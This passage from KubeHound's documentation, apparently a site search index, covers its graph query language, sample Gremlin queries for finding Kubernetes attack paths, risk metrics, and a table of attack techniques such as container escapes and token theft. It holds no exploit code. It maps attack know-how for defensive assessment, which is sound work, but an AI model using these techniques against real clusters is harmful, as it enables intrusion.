<code>kh.cluster(\"kind-kubehound.local\").services(\"app-front-proxy\")</code> <code>.sas([string...])</code> <code>.has(\"class\",\"Identity\").has(\"type\", \"ServiceAccount\")</code> <code>kh.cluster(\"kind-kubehound.local\").sas(\"postgres-admin\")</code> <code>.users([string...])</code> <code>.has(\"class\",\"Identity\").has(\"type\", \"User\")</code> <code>kh.cluster(\"kind-kubehound.local\").users(\"user@domain.tld\")</code> <code>.groups([string...])</code> <code>.has(\"class\",\"Identity\").has(\"type\", \"Group\")</code> <code>kh.cluster(\"kind-kubehound.local\").groups(\"engineering\")</code> <code>.volumes([string...])</code> <code>.has(\"class\",\"Volume\")</code> <code>kh.cluster(\"kind-kubehound.local\").volumes(\"db-data\")</code>"},{"location":"queries/dsl/#retrieving-attack-oriented-data","title":"Retrieving attack oriented data","text":"<p>These methods are defined in the <code>KubeHoundTraversalDsl</code> class.</p> Method Gremlin equivalent <code>.attacks()</code> <code>.outE().inV().path()</code> <code>.critical()</code> <code>.has(\"critical\", true)</code> <code>.criticalPaths(int)</code> see KubeHoundTraversalDsl.java <code>.criticalPathsFilter(int, string...)</code> see KubeHoundTraversalDsl.java <code>.criticalPathsFreq([maxHops])</code> see KubeHoundTraversalDsl.java <code>.hasCriticalPath()</code> <code>.where(__.criticalPaths().limit(1))</code> <code>.minHopsToCritical([maxHops])</code> see KubeHoundTraversalDsl.java <p>For more detailed explanation, please see below.</p> <p>Example of a kubehound DSL capabilities:</p> <pre><code>// Example returning all attacks from containers running the cilium 1.11.18 image\nkh.containers().has(\"image\", \"eu.gcr.io/internal/cilium:1.11.18\").attacks()\n</code></pre>"},{"location":"queries/dsl/#kubehound-constants","title":"KubeHound Constants","text":""},{"location":"queries/dsl/#endpoint-exposure","title":"Endpoint Exposure","text":"<p>Represents the exposure level of endpoints in the KubeHound graph</p> <pre><code>// Defines the exposure of an endpoint within the KubeHound model\npublic enum EndpointExposure {\n  None,\n    ClusterIP,                      // Container port exposed to cluster\n    NodeIP,                         // Kubernetes endpoint exposed outside the cluster\n    External,                       // Kubernetes endpoint exposed outside the cluster\n}\n</code></pre>"},{"location":"queries/dsl/#traversal-source-reference","title":"Traversal Source Reference","text":""},{"location":"queries/dsl/#run-step","title":"Run Step","text":"<p>Starts a traversal that finds all vertices from the specified KubeHound run(s).</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; run(String... ids)\n</code></pre> <p>Example usage:</p> <pre><code>// All vertices in the graph from a single run\nkh.run(\"01he5ebh73tah762qgdd5k4wqp\")\n\n// All vertices in the graph from a multiple runs\nkh.run(\"01he5ebh73tah762qgdd5k4wqp\", \"01he5eagzbnhtfnwzg7xxbyfz4\")\n\n// All containers in the graph from a single run\nkh.run(\"01he5ebh73tah762qgdd5k4wqp\").containers()\n</code></pre>"},{"location":"queries/dsl/#cluster-step","title":"Cluster Step","text":"<p>Starts a traversal that finds all vertices from the specified cluster(s).</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; cluster(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All vertices in the graph from the kind-kubehound.local cluster\nkh.cluster(\"kind-kubehound.local\")\n\n// All containers in the graph from the kind-kubehound.local cluster\nkh.cluster(\"kind-kubehound.local\").containers()\n</code></pre>"},{"location":"queries/dsl/#containers-step","title":"Containers Step","text":"<p>Starts a traversal that finds all vertices with a \"Container\" label and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; containers(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All containers in the graph\nkh.containers()\n\n// All containers in the graph with name filter\nkh.containers(\"elasticsearch\", \"mongo\")\n\n// All containers in the graph with additional filters\nkh.containers().has(\"namespace\", \"ns1\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#pods-step","title":"Pods Step","text":"<p>Starts a traversal that finds all vertices with a \"Pod\" label and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; pods(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All pods in the graph\nkh.pods()\n\n// All pod in the graph with name filter\nkh.pods(\"app-pod\", \"sidecar-pod\")\n\n// All pods in the graph with additional filters\nkh.pods().has(\"namespace\", \"ns1\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#nodes-step","title":"Nodes Step","text":"<p>Starts a traversal that finds all vertices with a \"Node\" label and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; nodes(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All nodes in the graph\nkh.nodes()\n\n// All nodes in the graph with name filter\nkh.nodes(\"control-plane\")\n\n// All nodes in the graph with additional filters\nkh.nodes().has(\"team\", \"sre\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#escapes-step","title":"Escapes Step","text":"<p>Starts a traversal that finds all container escape edges from a Container vertex to a Node vertex and optionally allows filtering of those vertices on the \"nodeNames\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Path&gt; escapes(String... nodeNames)\n</code></pre> <p>Example usage:</p> <pre><code>// All container escapes in the graph\nkh.escapes()\n\n// All container escapes in the graph with node name filter\nkh.escapes(\"control-plane\")\n</code></pre>"},{"location":"queries/dsl/#endpoints-step","title":"Endpoints Step","text":"<p>Starts a traversal that finds all vertices with a \"Endpoint\" label.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; endpoints()\nGraphTraversal&lt;Vertex, Vertex&gt; endpoints(EndpointExposure exposure)\n</code></pre> <p>Example usage:</p> <pre><code>// All endpoints in the graph\nkh.endpoints()\n\n// All endpoints in the graph with additional filters\nkh.endpoints().has(\"port\", 3000).limit(10)\n\n// All endpoints with K8s service exposure\nkh.endpoints(EndpointExposure.External)\n</code></pre>"},{"location":"queries/dsl/#services-step","title":"Services Step","text":"<p>Starts a traversal that finds all vertices with a \"Endpoint\" label representing K8s services.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; services(String... portNames)\n</code></pre> <p>Example usage:</p> <pre><code>// All services in the graph\nkh.services()\n\n// All services in the graph with name filter\nkh.services(\"jmx\", \"redis\")\n\n// All services in the graph with additional filters\nkh.services().has(\"port\", 9999).limit(10)\n</code></pre>"},{"location":"queries/dsl/#volumes-step","title":"Volumes Step","text":"<p>Starts a traversal that finds all vertices with a \"Volume\" label and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; volumes(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All volumes in the graph\nkh.volumes()\n\n// All volumes in the graph with name filter\nkh.volumes(\"db-data\", \"proc-mount\")\n\n// All volumes in the graph with additional filters\nkh.volumes().has(\"sourcePath\", \"/\").has(\"app\", \"web-app\")\n</code></pre>"},{"location":"queries/dsl/#hostmounts-step","title":"HostMounts Step","text":"<p>Starts a traversal that finds all vertices representing volume host mounts and optionally allows filtering of those vertices on the \"sourcePath\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; hostMounts(String... sourcePaths)\n</code></pre> <p>Example usage:</p> <pre><code>// All host mounted volumes in the graph\nkh.hostMounts()\n\n// All host mount volumes in the graph with source path filter\nkh.hostMounts(\"/\", \"/proc\")\n\n// All host mount volumes in the graph with additional filters\nkh.hostMounts().has(\"app\", \"web-app\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#identities-step","title":"Identities Step","text":"<p>Starts a traversal that finds all vertices with a \"Identity\" label and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; identities(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All identities in the graph\nkh.identities()\n\n// All identities in the graph with name filter\nkh.identities(\"postgres-admin\", \"db-reader\")\n\n// All identities in the graph with additional filters\nkh.identities().has(\"app\", \"web-app\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#sas-step","title":"SAS Step","text":"<p>Starts a traversal that finds all vertices representing service accounts and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; sas(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All service accounts in the graph\nkh.sas()\n\n// All service accounts in the graph with name filter\nkh.sas(\"postgres-admin\", \"db-reader\")\n\n// All service accounts in the graph with additional filters\nkh.sas().has(\"app\", \"web-app\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#users-step","title":"Users Step","text":"<p>Starts a traversal that finds all vertices representing users and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; users(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All users in the graph\nkh.users()\n\n// All users in the graph with name filter\nkh.users(\"postgres-admin\", \"db-reader\")\n\n// All users in the graph with additional filters\nkh.users().has(\"app\", \"web-app\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#groups-step","title":"Groups Step","text":"<p>Starts a traversal that finds all vertices representing groups and optionally allows filtering of those vertices on the \"name\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; groups(String... names)\n</code></pre> <p>Example usage:</p> <pre><code>// All groups in the graph\nkh.groups()\n\n// All groups in the graph with name filter\nkh.groups(\"postgres-admin\", \"db-reader\")\n\n// All groups in the graph with additional filters\nkh.groups().has(\"app\", \"web-app\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#permissions-step","title":"Permissions Step","text":"<p>Starts a traversal that finds all vertices with a \"PermissionSet\" label and optionally allows filtering of those vertices on the \"role\" property.</p> <pre><code>GraphTraversal&lt;Vertex, Vertex&gt; permissions(String... roles)\n</code></pre> <p>Example usage:</p> <pre><code>// All permissions sets in the graph\nkh.permissions()\n\n// All permissions sets in the graph with role filter\nkh.permissions(\"postgres-admin\", \"db-reader\")\n\n// All permissions sets in the graph with additional filters\nkh.permissions().has(\"app\", \"web-app\").limit(10)\n</code></pre>"},{"location":"queries/dsl/#traversal-reference","title":"Traversal Reference","text":""},{"location":"queries/dsl/#attacks-step","title":"Attacks Step","text":"<p>From a Vertex traverse immediate edges to display the next set of possible attacks and targets</p> <pre><code>GraphTraversal&lt;S, Path&gt; attacks()\n</code></pre> <p>Example usage:</p> <p>Note</p> <p>The <code>attacks()</code> step returns paths, which can be further processed with other steps. You can use  the <code>elementMap()</code> step to display the properties of the vertices and edges in the path.  Invoking the <code>attacks()</code> step alone will raise a query error.</p> <pre><code>// All attacks possible from a specific container in the graph\nkh.containers(\"pwned-container\").attacks().by(elementMap())\n</code></pre>"},{"location":"queries/dsl/#critical-step","title":"Critical Step","text":"<p>From a Vertex filter on whether incoming vertices are critical assets</p> <pre><code>GraphTraversal&lt;S, E&gt; critical()\n</code></pre> <p>Example usage:</p> <pre><code>// All critical assets in the graph\nkh.V().critical()\n\n// Check whether a specific permission set is marked as critical\nkh.permissions(\"system::kube-controller\").critical()\n</code></pre>"},{"location":"queries/dsl/#criticalpaths-step","title":"CriticalPaths Step","text":"<p>From a Vertex traverse edges until {@code maxHops} is exceeded or a critical asset is reached and return all paths.</p> <pre><code>GraphTraversal&lt;S, Path&gt; criticalPaths()\nGraphTraversal&lt;S, Path&gt; criticalPaths(int maxHops)\n</code></pre> <p>Example usage:</p> <p>Note</p> <p>The <code>criticalPaths()</code> step returns paths, which can be further processed with other steps. You can use  the <code>elementMap()</code> step to display the properties of the vertices and edges in the path.  Invoking the <code>criticalPaths()</code> step alone will raise a query error.</p> <pre><code>// All attack paths from services to a critical asset\nkh.services().criticalPaths().by(elementMap())\n\n// All attack paths (up to 5 hops) from a compromised credential to a critical asset\nkh.group(\"engineering\").criticalPaths(5).by(elementMap())\n</code></pre>"},{"location":"queries/dsl/#criticalpathsfilter-step","title":"CriticalPathsFilter Step","text":"<p>From a Vertex traverse edges EXCLUDING labels provided in <code>exclusions</code> until <code>maxHops</code> is exceeded or a critical asset is reached and return all paths.</p> <pre><code>GraphTraversal&lt;S, Path&gt; criticalPathsFilter(int maxHops, String... exclusions)\n</code></pre> <p>Example usage:</p> <p>Note</p> <p>The <code>criticalPathsFilter()</code> step returns paths, which can be further processed with other steps. You can use  the <code>elementMap()</code> step to display the properties of the vertices and edges in the path.  Invoking the <code>criticalPathsFilter()</code> step alone will raise a query error.</p> <pre><code>// All attack paths (up to 10 hops) from services to a critical asset excluding the TOKEN_BRUTEFORCE and TOKEN_LIST attacks\nkh.services().criticalPathsFilter(10, \"TOKEN_BRUTEFORCE\", \"TOKEN_LIST\").by(elementMap())\n</code></pre>"},{"location":"queries/dsl/#hascriticalpath-step","title":"HasCriticalPath Step","text":"<p>From a Vertex filter on whether incoming vertices have at least one path to a critical asset</p> <pre><code>GraphTraversal&lt;S, E&gt; hasCriticalPath()\n</code></pre> <p>Example usage:</p> <pre><code>// All services with an attack path to a critical asset\nkh.services().hasCriticalPath()\n</code></pre>"},{"location":"queries/dsl/#minhopstocritical-step","title":"MinHopsToCritical Step","text":"<p>From a Vertex returns the hop count of the shortest path to a critical asset.</p> <pre><code>&lt;E2 extends Comparable&gt; GraphTraversal&lt;S, E2&gt; minHopsToCritical()\n&lt;E2 extends Comparable&gt; GraphTraversal&lt;S, E2&gt; minHopsToCritical(int maxHops)\n</code></pre> <p>Example usage:</p> <pre><code>// Shortest hops from a service to a critical asset\nkh.services().minHopsToCritical()\n\n// Shortest hops from a compromised engineer credential to a critical asset (up to 6)\nkh.group(\"engineering\").minHopsToCritical(6)\n</code></pre>"},{"location":"queries/dsl/#criticalpathsfreq-step","title":"CriticalPathsFreq Step","text":"<p>From a Vertex returns a group count (by label) of paths to a critical asset.</p> <pre><code>&lt;K&gt; GraphTraversal&lt;S, Map&lt;K, Long&gt;&gt; criticalPathsFreq()\n&lt;K&gt; GraphTraversal&lt;S, Map&lt;K, Long&gt;&gt; criticalPathsFreq(int maxHops)\n</code></pre> <p>Example usage:</p> <pre><code>// Most common critical paths from services\nkh.services().criticalPathsFreq()\n\n// Most common critical paths from a compromised engineer credential of up to 4 hops\nkh.group(\"engineering\").criticalPathsFreq(4)\n</code></pre> <p>Sample output:</p> <pre><code>{\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\": 6,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, VOLUME_DISCOVER, Volume, TOKEN_STEAL, Identity, PERMISSION_DISCOVER, PermissionSet]\": 6,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, CE_NSENTER, Node, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\": 1,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, CE_MODULE_LOAD, Node, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\": 1,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, CE_PRIV_MOUNT, Node, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\": 1\n}\n</code></pre>"},{"location":"queries/gremlin/","title":"Queries","text":"<p>You can query KubeHound data stored in the JanusGraph database by using the Gremlin query language.</p>"},{"location":"queries/gremlin/#basic-queries","title":"Basic queries","text":"Count the number of pods in the cluster<pre><code>g.V().has(\"class\",\"Pod\").count()\n</code></pre> View all possible container escapes in the cluster<pre><code>g.V().has(\"class\",\"Container\").outE().inV().has(\"class\",\"Node\").path()\n</code></pre> List the names of all possible attacks in the cluster<pre><code>g.E().groupCount().by(label)\n</code></pre> View all the mounted host path volumes in the cluster<pre><code>g.V().has(\"class\",\"Volume\").has(\"type\", \"HostPath\").groupCount().by(\"sourcePath\")\n</code></pre> View host path mounts that can be exploited to escape to a node<pre><code>g.E().has(\"class\",\"EXPLOIT_HOST_READ\", \"EXPLOIT_HOST_WRITE\").outV().groupCount().by(\"sourcePath\")\n</code></pre> View all service endpoints by service name in the cluster<pre><code>// Leveraging the \"EndpointExposureType\" enum value to filter only on services\n// c.f. https://github.com/DataDog/KubeHound/blob/main/pkg/kubehound/models/shared/constants.go\ng.V().has(\"class\",\"Endpoint\").has(\"exposure\", 3).groupCount().by(\"serviceEndpoint\")\n</code></pre>"},{"location":"queries/gremlin/#basic-attack-paths","title":"Basic attack paths","text":"All paths between an endpoint and a node<pre><code>g.V().has(\"class\",\"Endpoint\").repeat(out().simplePath()).until(has(\"class\",\"Node\")).path()\n</code></pre> All paths (up to 5 hops) between a container and a node<pre><code>g.V().has(\"class\",\"Container\").repeat(out().simplePath()).until(has(\"class\",\"Node\").or().loops().is(5)).has(\"class\",\"Node\").path()\n</code></pre> All attack paths (up to 6 hops) from any compomised identity (e.g. service account) to a critical asset<pre><code>g.V().has(\"class\",\"Identity\").repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(6)).has(\"critical\", true).path().limit(5)\n</code></pre>"},{"location":"queries/gremlin/#attack-paths-from-compromised-assets","title":"Attack paths from compromised assets","text":""},{"location":"queries/gremlin/#containers","title":"Containers","text":"Attack paths (up to 10 hops) from a known breached container to any critical asset<pre><code>g.V().has(\"class\",\"Container\").has(\"name\", \"nsenter-pod\").repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(10)).has(\"critical\", true).path()\n</code></pre> Attack paths (up to 10 hops) from a known backdoored container image to any critical asset<pre><code>g.V().has(\"class\",\"Container\").has(\"image\", TextP.containing(\"malicious-image\")).repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(10)).has(\"critical\", true).path()\n</code></pre>"},{"location":"queries/gremlin/#credentials","title":"Credentials","text":"Attack paths (up to 10 hops) from a known breached identity to a critical asset<pre><code>g.V().has(\"class\",\"Identity\").has(\"name\", \"compromised-sa\").repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(10)).has(\"critical\", true).path()\n</code></pre>"},{"location":"queries/gremlin/#endpoints","title":"Endpoints","text":"Attack paths (up to 6 hops) from any endpoint to a critical asset:<pre><code>g.V().has(\"class\",\"Endpoint\").repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(6)).has(\"critical\", true).path().limit(5)\n</code></pre> Attack paths (up to 10 hops) from a known risky endpoint (e.g JMX) to a critical asset<pre><code>g.V().has(\"class\",\"Endpoint\").has(\"portName\", \"jmx\").repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(6)).has(\"critical\", true).path().limit(5)\n</code></pre>"},{"location":"queries/gremlin/#risk-assessment","title":"Risk assessment","text":"What is the shortest exploitable path between an exposed service and a critical asset?<pre><code>g.V().has(\"class\",\"Endpoint\").has(\"exposure\", gte(3)).repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(7)).has(\"critical\", true).path().count(local).min()\n</code></pre> What percentage of external facing services have an exploitable path to a critical asset?<pre><code>// Leveraging the \"EndpointExposureType\" enum value to filter only on services\n// c.f. https://github.com/DataDog/KubeHound/blob/main/pkg/kubehound/models/shared/constants.go\n\n// Base case\ng.V().has(\"class\",\"Endpoint\").has(\"exposure\", gte(3)).count()\n\n// Has a critical path\ng.V().has(\"class\",\"Endpoint\").has(\"exposure\", gte(3)).where(repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(10)).has(\"critical\", true).limit(1)).count()\n</code></pre>"},{"location":"queries/gremlin/#cve-impact-assessment","title":"CVE impact assessment","text":"<p>You can also use KubeHound to determine if workloads in your cluster may be vulnerable to a specific vulnerability.</p> <p>First, evaluate if a known vulnerable image is running in the cluster:</p> <pre><code>g.V().has(\"class\",\"Container\").has(\"image\", TextP.containing(\"elasticsearch\")).groupCount().by(\"image\")\n</code></pre> <p>Then, check any exposed services that could be affected and have a path to a critical asset. This helps prioritizing patching and remediation.</p> <pre><code>g.V().has(\"class\",\"Container\").has(\"image\", \"dockerhub.com/elasticsearch:7.1.4\").where(inE(\"ENDPOINT_EXPLOIT\").outV().has(\"exposure\", gte(3))).where(repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(10)).has(\"critical\", true).limit(1))\n</code></pre>"},{"location":"queries/gremlin/#assessing-the-value-of-implementing-new-security-controls","title":"Assessing the value of implementing new security controls","text":"<p>To verify concrete impact, this can be achieved by comparing the difference in the key risk metrics above, before and after the control change. To simulate the impact of introducing a control (e.g to evaluate ROI), we can add conditions to our path queries. For example if we wanted to evaluate the impact of adding a gatekeeper rule that would deny the use of <code>hostPID</code> we can use the following:</p> What percentage level of attack path reduction was achieved by the introduction of a control?<pre><code>// Calculate the base case\ng.V().has(\"class\",\"Endpoint\").has(\"exposure\", gte(3)).repeat(out().simplePath()).until(has(\"critical\", true).or().loops().is(6)).has(\"critical\", true).path().count()\n\n// Calculate the impact of preventing CE_NSENTER attack\ng.V().has(\"class\",\"Endpoint\").has(\"exposure\", gte(3)).repeat(outE().not(has(\"class\",\"CE_NSENTER\")).inV().simplePath()).emit().until(has(\"critical\", true).or().loops().is(6)).has(\"critical\", true).path().count()\n</code></pre> What type of control would cut off the largest number of attack paths to a specific asset in the cluster?<pre><code>// We count the number of instances of unique attack paths using\ng.V().has(\"class\",\"Container\").repeat(outE().inV().simplePath()).emit()\n.until(has(\"critical\", true).or().loops().is(6)).has(\"critical\", true)\n.path().by(label).groupCount().order(local).by(select(values), desc)\n\n/* Sample output:\n\n  {\n    \"path[Container, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet, TOKEN_LIST, Identity, PERMISSION_DISCOVER, PermissionSet, TOKEN_LIST, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 191,\n    \"path[Container, CE_SYS_PTRACE, Node, VOLUME_EXPOSE, Volume, TOKEN_STEAL, Identity, PERMISSION_DISCOVER, PermissionSet, TOKEN_LIST, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 48,\n    \"path[Container, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet, TOKEN_BRUTEFORCE, Identity, PERMISSION_DISCOVER, PermissionSet, TOKEN_LIST, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 48,\n    ...\n  }\n*/\n</code></pre>"},{"location":"queries/gremlin/#threat-modelling","title":"Threat modelling","text":"All unique attack paths by labels to a specific asset (here, the cluster-admin role)<pre><code>g.V().has(\"class\",\"Container\", \"Identity\")\n.repeat(out().simplePath())\n.until(has(\"name\", \"cluster-admin\").or().loops().is(5))\n.has(\"name\", \"cluster-admin\").has(\"class\",\"Role\").path().as(\"p\").by(label).dedup().select(\"p\").path()\n</code></pre> All unique attack paths by labels to a any critical asset<pre><code>g.V().has(\"class\",\"Container\", \"Identity\")\n.repeat(out().simplePath())\n.until(has(\"critical\", true).or().loops().is(5))\n.has(\"critical\", true).path().as(\"p\").by(label).dedup().select(\"p\").path()\n</code></pre>"},{"location":"queries/gremlin/#tips-for-writing-queries","title":"Tips for writing queries","text":"<p>To get started with Gremlin, have a look at the following tutorials:</p> <ul> <li>Gremlin basics by Daniel Kuppitz</li> <li>Gremlin advanced by Daniel Kuppitz</li> </ul> <p>For large clusters it is recommended to add a <code>limit()</code> step to all queries where the graph output will be examined in the UI to prevent overloading it. An example looking for attack paths possible from a sample of 5 containers would look like:</p> <pre><code>g.V().has(\"class\",\"Container\").limit(5).outE()\n</code></pre> <p>Additional tips:</p> <ul> <li>For queries to be displayed in the UI, try to limit the output to 1000 elements or less</li> <li>Enable <code>large cluster optimizations</code> via configuration file if queries are returning too slowly</li> <li>Try to filter the initial element of queries by namespace/service/app to avoid generating too many results, for instance <code>g.V().has(\"class\",\"Container\").has(\"namespace\", \"your-namespace\")</code></li> </ul>"},{"location":"queries/metrics/","title":"Metrics","text":"<p>Aside from the obvious offensive use cases, KubeHound is most useful in calculating quantitative risk metrics representing the security posture of a cluster. The original goal of the project was to enable answering the following questions:</p> <ul> <li>What is the shortest exploitable path between an external service and a critical asset?</li> <li>What percentage of external services have an exploitable path to a critical asset?</li> <li>What type of control would cut off the largest number of attack paths to a critical asset in our clusters?</li> <li>What percentage level of attack path reduction could be achieved by the introduction of a control?</li> </ul> <p>This section provides a short cheatsheet of gremlin queries to answer each of these in turn</p>"},{"location":"queries/metrics/#what-is-the-shortest-exploitable-path-between-an-external-service-and-a-critical-asset","title":"What is the shortest exploitable path between an external service and a critical asset?","text":"<pre><code>kh.services().minHopsToCritical()\n</code></pre>"},{"location":"queries/metrics/#what-percentage-of-external-services-have-an-exploitable-path-to-a-critical-asset","title":"What percentage of external services have an exploitable path to a critical asset?","text":"<pre><code>// number of services with a path to a critical asset = N\nkh.services().hasCriticalPath().count()\n\n// total number of services = D\nkh.services().count()\n\n// Answer = N / D\n</code></pre>"},{"location":"queries/metrics/#what-type-of-control-would-cut-off-the-largest-number-of-attack-paths-to-a-critical-asset-in-our-clusters","title":"What type of control would cut off the largest number of attack paths to a critical asset in our clusters?","text":"<p>In this example an infrastructure team is prioritising new security mitigations for a cluster. Based on a shortest path analysis using <code>minHopsToCritical</code> they are looking to prioritise attack paths of 4 hops. What are the most common paths here? Are there any common patterns that emerge? This can be surfaced via the <code>criticalPathsFreq</code> DSL method:</p> <pre><code>kh.services().criticalPathsFreq(4)\n</code></pre> <p>Running against the cluster generates the following attack path grouping:</p> <pre><code>{\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 6,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, VOLUME_DISCOVER, Volume, TOKEN_STEAL, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 6,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, CE_NSENTER, Node, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 1,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, CE_MODULE_LOAD, Node, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 1,\n  \"path[Endpoint, ENDPOINT_EXPLOIT, Container, CE_PRIV_MOUNT, Node, IDENTITY_ASSUME, Identity, PERMISSION_DISCOVER, PermissionSet]\" : 1\n}\n</code></pre> <p>From this analysis it appears that the top attack paths are coming from containers with external services running with service accounts with <code>critical</code> permissions which look like strong candidates for immediate remediation!</p>"},{"location":"queries/metrics/#what-percentage-level-of-attack-path-reduction-could-be-achieved-by-the-introduction-of-a-control","title":"What percentage level of attack path reduction could be achieved by the introduction of a control?","text":"<p>In this example a threat detection team is considering implementing detections and auto remediation on secret access that would completely mitigate the <code>TOKEN_BRUTEFORCE</code> and <code>TOKEN_LIST</code> attacks, but the work is resource intensive. Is it worth the effort? A good measure of the impact would be to evaluate the attack path reduction as a result of this change:</p> <pre><code>// number of attack paths from service endpoints excluding the mitigated attack = A\nkh.services().criticalPathsFilter(10, \"TOKEN_BRUTEFORCE\", \"TOKEN_LIST\").count()\n\n// total number of attack paths from service endpoints = B\nkh.V().criticalPaths().count()\n\n// Answer = (A-B)/A\n</code></pre>"},{"location":"reference/attacks/","title":"Attack Reference","text":"<p>All edges in the KubeHound graph represent attacks with a net \"improvement\" in an attacker's position or a lateral movement opportunity.</p> <p>Note</p> <p>For instance, an assume role or (IDENTITY_ASSUME) is considered as an attack.</p> ID Name MITRE ATT&amp;CK Technique MITRE ATT&amp;CK Tactic Coverage CE_MODULE_LOAD Container escape: Load kernel module Escape to host Privilege escalation Full CE_NSENTER Container escape: nsenter Escape to host Privilege escalation Full CE_PRIV_MOUNT Container escape: Mount host filesystem Escape to host Privilege escalation Full CE_SYS_PTRACE Container escape: Attach to host process via SYS_PTRACE Escape to host Privilege escalation Full CE_UMH_CORE_PATTERN Container escape: through core_pattern usermode_helper Escape to host Privilege escalation Full CE_VAR_LOG_SYMLINK Arbitrary file reads on the host Escape to host Privilege escalation Full CONTAINER_ATTACH Attach to running container Container Administration Command Execution Full ENDPOINT_EXPLOIT Exploit exposed endpoint Exploitation of Remote Services Lateral Movement Full EXPLOIT_CONTAINERD_SOCK Container escape: Through mounted container runtime socket Deploy Container Execution None EXPLOIT_HOST_READ Read file from sensitive host mount Escape to host Privilege escalation Full EXPLOIT_HOST_TRAVERSE Steal service account token through kubelet host mount Unsecured Credentials Credential Access Full EXPLOIT_HOST_WRITE Container escape: Write to sensitive host mount Escape to host Privilege escalation Full IDENTITY_ASSUME Act as identity Valid Accounts Privilege escalation Full IDENTITY_IMPERSONATE Impersonate user/group Valid Accounts Privilege escalation None PERMISSION_DISCOVER Enumerate permissions Permission Groups Discovery Discovery Full POD_ATTACH Attach to running pod Container Administration Command Execution Full POD_CREATE Create privileged pod Deploy Container Execution Full POD_EXEC Exec into running pod Container Administration Command Execution Full POD_PATCH Patch running pod Container Administration Command Execution Full ROLE_BIND Create role binding Valid Accounts Privilege Escalation Partial SHARE_PS_NAMESPACE Access container in shared process namespace Taint Shared Content Lateral Movement Full TOKEN_BRUTEFORCE Brute-force secret name of service account token Steal Application Access Token Credential Access Full TOKEN_LIST Access service account token secrets Steal Application Access Token Credential Access Full TOKEN_STEAL Steal service account token from volume Unsecured Credentials Credential Access Full VOLUME_ACCESS Access host volume Container and Resource Discovery Discovery Full VOLUME_DISCOVER Enumerate mounted volumes Container and Resource Discovery Discovery Full"},{"location":"reference/attacks/CE_MODULE_LOAD/","title":"CE_MODULE_LOAD","text":""},{"location":"reference/attacks/CE_MODULE_LOAD/#ce_module_load","title":"CE_MODULE_LOAD","text":"Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611 <p>Load a kernel module from within an overprivileged container to breakout into the node.</p>"},{"location":"reference/attacks/CE_MODULE_LOAD/#details","title":"Details","text":"<p>Container isolation mechanisms are restricted to user-space execution. If an attacker gains kernel level execution via loading a kernel module or exploiting a kernel vulnerability, all isolation mechanisms can be bypassed. If a container is run with <code>--privileged</code> or if <code>CAP_SYS_MODULE</code> is explicitly enabled via the <code>securityContext</code> setting, kernel modules can be loaded from within the container, leading to a 